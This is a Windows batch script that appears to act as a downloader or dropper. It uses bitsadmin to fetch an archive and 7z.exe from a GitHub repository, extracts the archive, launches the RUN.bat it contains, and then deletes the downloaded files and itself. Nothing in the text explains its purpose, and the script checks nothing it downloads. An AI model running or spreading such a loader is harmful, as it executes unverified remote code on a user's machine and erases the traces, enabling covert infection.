@echo off
bitsadmin.exe /transfer "LOL" /priority FOREGROUND https://raw.githubusercontent.com/bugai66/Elysium_Files/master/INSTALL.7z "%~dp0INSTALL.7z"
bitsadmin.exe /transfer "LOL" /priority FOREGROUND https://raw.githubusercontent.com/bugai66/Elysium_Files/master/7z.exe "%~dp07z.exe"
"%~dp0\7z" e "INSTALL.7z"
start cmd /c "RUN.bat"
DEL "%~dp07z.exe"
DEL "%~dp0INSTALL.7z"
DEL "%~f0"
EXIT